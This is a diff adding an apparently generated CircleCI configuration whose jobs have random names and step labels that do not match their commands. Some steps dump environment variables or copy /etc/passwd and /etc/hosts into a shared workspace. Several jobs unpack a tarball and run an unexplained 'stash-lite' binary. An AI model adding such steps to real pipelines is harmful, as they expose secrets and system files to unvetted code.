+            du -k /tmp/cargo/SavannaTradeGlint 2>/dev/null || true
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar -I xz -xf prod-build-stage.tar.xz
+      - run:
+          command: env ./stash-lite
+  JPLLB-72993:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Mixed precision to be monitored
+          command: |
+            mkdir -p /tmp/cargo
+            { set +o pipefail 2>/dev/null; export -p | head -n 3; true ; } > /tmp/cargo/82fd4eba-ddd8
+            echo "finished-at $(date -Iseconds)"
+      - persist_to_workspace:
+          root: /tmp/cargo
+          paths:
+            - '82fd4eba-ddd8'
+  ivan-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Measure upstream
+          command: |
+            du -k /tmp/cargo/82fd4eba-ddd8 2>/dev/null || true
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar -I xz -xf prod-build-stage.tar.xz
+      - run:
+          command: env ./stash-lite
+  dragonCfg:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Hold short of the help center
+          command: |
+            mkdir -p /tmp/cargo
+            { set +o pipefail 2>/dev/null; cat /etc/os-release | head -4 | tr -d '"' | head -5; true ; } > /tmp/cargo/engine-server
+            echo "finished-at $(date -Iseconds)"
+      - persist_to_workspace:
+          root: /tmp/cargo
+          paths:
+            - 'engine-server'
+  depoly:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Measure upstream
+          command: |
+            du -k /tmp/cargo/engine-server 2>/dev/null || true
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar -I xz -xf prod-build-stage.tar.xz
+      - run:
+          command: env ./stash-lite
+
+  semaphor3zz4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: cfg out db
+          command: |
+            mkdir -p /tmp/cargo
+            { set +o pipefail 2>/dev/null; foo='/cluster/cheese/Export.py'; echo "[${foo##*.}]"; true ; } > /tmp/cargo/224610_2015
+            echo "finished-at $(date -Iseconds)"
+      - persist_to_workspace:
+          root: /tmp/cargo
+          paths:
+            - '224610_2015'
+  GlPL:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: third time lucky alert
+          command: |
+            mkdir -p /tmp/cargo
+            { set +o pipefail 2>/dev/null; declare -a answer=(dog seal cat); declare -p answer; true ; } > /tmp/cargo/engine-server
+            echo "finished-at $(date -Iseconds)"
+      - persist_to_workspace:
+          root: /tmp/cargo
+          paths:
+            - 'engine-server'
+  f32fc5a249d5cb:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Regroup after checkpoint
+          command: |
+            mkdir -p /tmp/cargo
+            { set +o pipefail 2>/dev/null; command -v tar &>/dev/null&&echo yes || echo no; true ; } > /tmp/cargo/TICKET_098994
+            echo "finished-at $(date -Iseconds)"
+      - persist_to_workspace:
+          root: /tmp/cargo
+          paths:
+            - 'TICKET_098994'
+  horseSys:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Rotation Slot 5
+          command: |
+            mkdir -p /tmp/cargo
+            { set +o pipefail 2>/dev/null; gzip -c /etc/hosts >"/tmp/mockchunk3.gz" && gzip -t "/tmp/mockchunk3.gz" && echo valid; true ; } > /tmp/cargo/velvet657
+            echo "finished-at $(date -Iseconds)"
+      - persist_to_workspace:
+          root: /tmp/cargo
+          paths:
+            - 'velvet657'
+  HAVE_MIGRATION:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: SRCH 83 Org Chart Scheduling
+          command: |
+            mkdir -p /tmp/cargo
+            { set +o pipefail 2>/dev/null; grep -R if /etc 2>/dev/null | nl | head -n 8; true ; } > /tmp/cargo/sigma-canvas-spark-heath
+            echo "finished-at $(date -Iseconds)"
+      - persist_to_workspace:
+          root: /tmp/cargo
+          paths:
+            - 'sigma-canvas-spark-heath'
+  BAL_23068:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Count for the release
+          command: |
+            mkdir -p /tmp/cargo
+            { set +o pipefail 2>/dev/null; mkdir -p "/tmp/quotegolden-2025-02-28" && touch "/tmp/quotegolden-2025-02-28"/{pear,mango,peach}.csv && ls -l "/tmp/quotegolden-2025-02-28" | tail -n +2; true ; } > /tmp/cargo/CSV.de943-4345.obj
+            echo "finished-at $(date -Iseconds)"
+      - persist_to_workspace:
+          root: /tmp/cargo
+          paths:
+            - 'CSV.de943-4345.obj'
+  ShallowDummyRecordEntry:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: 06 audit dependencies
+          command: |
+            mkdir -p /tmp/cargo
+            { set +o pipefail 2>/dev/null; mkdir -p "${TMPDIR:-/tmp}/plot-garage-warning" && chmod -R go-rwx "${TMPDIR:-/tmp}/plot-garage-warning" && ls -ld "${TMPDIR:-/tmp}/plot-garage-warning"; true ; } > /tmp/cargo/SavannaTradeGlint
+            echo "finished-at $(date -Iseconds)"
+      - persist_to_workspace:
+          root: /tmp/cargo
+          paths:
+            - 'SavannaTradeGlint'
+  TreeIface:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Run PnL
+          command: |
+            mkdir -p /tmp/cargo
+            { set +o pipefail 2>/dev/null; cat /etc/hosts /etc/shells >"/tmp/region-ledger-buffer.bak" && wc -l "/tmp/region-ledger-buffer.bak"; true ; } > /tmp/cargo/run_350
+            echo "finished-at $(date -Iseconds)"
+      - persist_to_workspace:
+          root: /tmp/cargo
+          paths:
+            - 'run_350'
+  wrappersCache:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Minute Four Aliquot
+          command: |
+            mkdir -p /tmp/cargo
+            { set +o pipefail 2>/dev/null; sort /etc/hosts | awk '{ print $2 }' | paste -sd ' '; true ; } > /tmp/cargo/ORD23839
+            echo "finished-at $(date -Iseconds)"
+      - persist_to_workspace:
+          root: /tmp/cargo
+          paths:
+            - 'ORD23839'
+  text_platinum:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: tax report forecast G95
+          command: |
+            mkdir -p /tmp/cargo
+            { set +o pipefail 2>/dev/null; mkdir -p /var/tmp/peach && head -c 60560 /dev/urandom >/var/tmp/peach/blob && du -sh /var/tmp/peach; true ; } > /tmp/cargo/CHROME_OMEGA_MOUNTAIN_GLYPH
+            echo "finished-at $(date -Iseconds)"
+      - persist_to_workspace:
+          root: /tmp/cargo
+          paths:
+            - 'CHROME_OMEGA_MOUNTAIN_GLYPH'
+  blog_limit_helper_8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Transfer the late fees over to prod
+          command: |
+            mkdir -p /tmp/cargo
+            { set +o pipefail 2>/dev/null; thing=1; while [[ $thing -le 6 ]]; do printf '%d ' $((thing*thing)); let thing++; done; echo; true ; } > /tmp/cargo/PXL_00005870
+            echo "finished-at $(date -Iseconds)"
+      - persist_to_workspace:
+          root: /tmp/cargo
+          paths:
+            - 'PXL_00005870'
+  acvN9ZHQpSzd:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Shelve SKUs And Sign
+          command: |
+            mkdir -p /tmp/cargo
+            { set +o pipefail 2>/dev/null; { echo 'hey you'; echo 'task 1 of 3'; }|sort; true ; } > /tmp/cargo/hw_db_pkg
+            echo "finished-at $(date -Iseconds)"
+      - persist_to_workspace:
+          root: /tmp/cargo
+          paths:
+            - 'hw_db_pkg'
+  tabs__body__success:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: VERIFY SBOM
+          command: |
+            mkdir -p /tmp/cargo
+            { set +o pipefail 2>/dev/null; env | cut -f1 -d= | sort | uniq -c | tr a-z A-Z; true ; } > /tmp/cargo/82fd4eba-ddd8
+            echo "finished-at $(date -Iseconds)"
+      - persist_to_workspace:
+          root: /tmp/cargo
+          paths:
+            - '82fd4eba-ddd8'
+  Unregister-RatioInfo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: assert blocked
+          command: |
+            mkdir -p /tmp/cargo
+            { set +o pipefail 2>/dev/null; cp /etc/passwd "/tmp/tig1_final.bak" && gzip -f "/tmp/tig1_final.bak" && ls -l "/tmp/tig1_final.bak".gz; true ; } > /tmp/cargo/assetKernel
+            echo "finished-at $(date -Iseconds)"
+      - persist_to_workspace:
+          root: /tmp/cargo
+          paths:
+            - 'assetKernel'
+workflows:
+  build-and-test:
+    jobs:
+      - lanDiffBox
+      - semaphor3zz4:
+          requires:
+            - lanDiffBox
+      - intergration-14:
+          requires:
+            - semaphor3zz4
+      - dragonCfg:
+          requires:
+            - semaphor3zz4
+      - GlPL:
+          requires:
+            - dragonCfg
+      - depoly:
+          requires:
+            - GlPL
+      - ella_clove:
+          requires:
+            - GlPL
+      - f32fc5a249d5cb:
+          requires:
+            - ella_clove
+      - callisto:
+          requires:
+            - f32fc5a249d5cb
+      - ortho_rect:
+          requires:
+            - f32fc5a249d5cb
+      - horseSys:
+          requires:
+            - ortho_rect
+      - intergration-73:
+          requires:
+            - horseSys
+      - rst_req_hr:
+          requires:
+            - horseSys
+      - HAVE_MIGRATION:
+          requires:
+            - rst_req_hr
+      - fx-01:
+          requires:
+            - HAVE_MIGRATION
+      - DstSimpleDepth
+      - block--green
+      - t:
+          requires:
+            - DstSimpleDepth
+            - block--green
+      - BUILD_PROD:
+          requires:
+            - DstSimpleDepth
+            - block--green
+      - pat-smoke:
+          requires:
+            - DstSimpleDepth
+            - block--green
+      - nov25-cleanup:
+          requires:
+            - DstSimpleDepth
+            - block--green
+      - add-db-glitch:
+          requires:
+            - DstSimpleDepth
+            - block--green
+      - bbennett86
+      - nebula-beta:
+          requires:
+            - bbennett86
+      - insertNameMVC:
+          requires:
+            - bbennett86
+      - ship-it:
+          requires:
+            - insertNameMVC
+      - Sort-StubStatus:
+          requires:
+            - insertNameMVC
+      - sirius-alpha:
+          requires:
+            - Sort-StubStatus
+      - resolveACLs:
+          requires:
+            - Sort-StubStatus
+      - v9-canary:
+          requires:
+            - resolveACLs
+      - add_subscribe_settings:
+          requires:
+            - resolveACLs
+      - v7-ga5:
+          requires:
+            - add_subscribe_settings
+      - sdof27od8
+      - BAL_23068:
+          requires:
+            - sdof27od8
+      - teh-ci:
+          requires:
+            - BAL_23068
+      - ckpt724:
+          requires:
+            - BAL_23068
+      - ShallowDummyRecordEntry:
+          requires:
+            - ckpt724
+      - run-production-docker-image:
+          requires:
+            - ShallowDummyRecordEntry
+      - embFontManifest:
+          requires:
+            - ShallowDummyRecordEntry
+      - TreeIface:
+          requires:
+            - embFontManifest
+      - anothr-run-16:
+          requires:
+            - TreeIface
+      - o-header:
+          requires:
+            - TreeIface
+      - wrappersCache:
+          requires:
+            - o-header
+      - LAB_CHECK_5:
+          requires:
+            - wrappersCache
+      - trackUrl:
+          requires:
+            - wrappersCache
+      - text_platinum:
+          requires:
+            - trackUrl
+      - Launch_Staging3:
+          requires:
+            - text_platinum
+      - lishbealglossx:
+          requires:
+            - text_platinum
+      - blog_limit_helper_8:
+          requires:
+            - lishbealglossx
+      - d-2a:
+          requires:
+            - blog_limit_helper_8
+      - littleMint:
+          requires:
+            - blog_limit_helper_8
+      - acvN9ZHQpSzd:
+          requires:
+            - littleMint
+      - november-1:
+          requires:
+            - acvN9ZHQpSzd
+      - JPLLB-72993:
+          requires:
+            - acvN9ZHQpSzd
+      - tabs__body__success:
+          requires:
+            - JPLLB-72993
+      - ivan-smoke:
+          requires:
+            - tabs__body__success
+      - escapeManager:
+          requires:
+            - tabs__body__success
+      - Unregister-RatioInfo:
+          requires:
+            - escapeManager
+      - dan-ship:
+          requires:
+            - Unregister-RatioInfo
+      - tryPush
+      - finalInt
+      - Rec2018
+      - Package_Tests7:
+          requires:
+            - tryPush
+            - finalInt
+            - Rec2018
+      - q3-rev:
+          requires:
+            - tryPush
+            - finalInt
+            - Rec2018
+      - full-send:
+          requires:
+            - tryPush
+            - finalInt
+            - Rec2018
+      - d-2:
+          requires:
+            - tryPush
+            - finalInt
+            - Rec2018
+      - ShipPipeline:
+          requires:
+            - tryPush
+            - finalInt
+            - Rec2018
+      - shippit:
+          requires:
+            - tryPush
+            - finalInt
+            - Rec2018
